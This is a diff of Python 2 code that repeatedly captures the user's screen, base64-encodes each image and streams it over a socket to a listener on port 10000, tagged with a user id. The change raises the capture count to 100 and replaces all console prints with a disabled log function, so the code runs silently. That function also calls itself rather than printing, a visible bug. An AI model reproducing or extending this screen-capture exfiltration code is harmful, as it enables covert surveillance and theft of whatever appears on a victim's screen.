@@ -9,29 +9,36 @@ import base64
 
 global userid
 
+DEBUG = 0
+
+def log(msg):
+	if DEBUG:
+		log(msg)
+	return
+
 def snap_handler(userid):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(("127.0.0.1", 10000))
-	for i in xrange(1):
-		print 'Getting snap num {0}'.format(i)
+	for i in xrange(100):
+		log('Getting snap num {0}'.format(i))
 		snapshot = ImageGrab.grab()
 		save_path = "C:\\Users\\user\\MySnapshot.jpg"
 		snapshot.save(save_path)
 		snapid = str(uuid.uuid4())
-		print 'got snap, snapid: ' + snapid
+		log('got snap, snapid: ' + snapid)
 		# Send
 		f = open(save_path, 'rb')
 		while True:
-			print 'Reading from snap'
-			raw_data = f.read(100000)
+			log('Reading from snap')
+			raw_data = f.read(500000)
 			if not raw_data:
-				print 'breaking'
+				log('breaking')
 				break
 			encoded_data = base64.b64encode(raw_data)
 			msg = "{0},{1},{2}".format(userid, snapid, encoded_data)
 			s.send(msg)
 			time.sleep(0.1)
-			print 'Sent snap'
+			log('Sent snap')
 
 		# finish, remove the file
 		f.close()
